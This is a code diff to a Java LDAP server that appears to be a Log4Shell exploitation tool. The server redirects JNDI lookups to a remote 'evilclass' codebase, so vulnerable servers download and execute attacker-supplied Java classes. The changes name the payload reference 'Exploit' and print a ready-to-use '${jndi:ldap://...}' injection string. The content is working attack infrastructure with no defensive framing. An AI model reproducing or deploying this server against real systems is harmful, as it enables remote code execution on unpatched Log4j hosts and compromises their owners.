@@ -20,6 +20,7 @@ import com.unboundid.ldap.sdk.ResultCode;
 
 public class LdapServer {
 
+    private static String LDAPReference = "Exploit";
     public static void main(String[] args) throws Exception {
         if(args.length == 0)
         {
@@ -55,9 +56,9 @@ public class LdapServer {
 
             config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(evilclass)));
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-            System.out.println("Listening on "+ ip + ":" + iport);
             ds.startListening();
-
+            System.out.println("- LDAP Server started at "+ ip + ":" + iport+" -");
+            System.out.println("- Log4J Injection Path: "+"${jndi:ldap://"+ip+":"+port+"/"+LdapServer.LDAPReference+"}"+" -");
         }
         catch ( Exception e ) {
             e.printStackTrace();
@@ -86,7 +87,7 @@ public class LdapServer {
 
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
             URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
-            System.out.println("Reference " + base + " will be redirected to " + turl);
+            System.out.println("- Reference will be redirected to " + turl);
             e.addAttribute("javaClassName", "test");
             String cbstring = this.codebase.toString();
             int refPos = cbstring.indexOf('#');
